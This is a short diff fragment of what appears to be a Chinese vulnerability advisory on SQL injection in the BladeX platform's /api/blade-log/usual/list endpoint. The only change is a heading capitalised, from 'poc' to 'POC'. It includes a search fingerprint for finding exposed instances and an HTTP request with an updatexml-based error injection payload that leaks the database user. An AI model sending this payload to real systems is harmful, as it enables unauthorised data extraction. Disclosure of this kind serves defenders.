@@ -8,7 +8,7 @@ BladeX企业级开发平台 usual/list 存在SQL注入漏洞，攻击者除了�
 body="https://bladex.vip"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
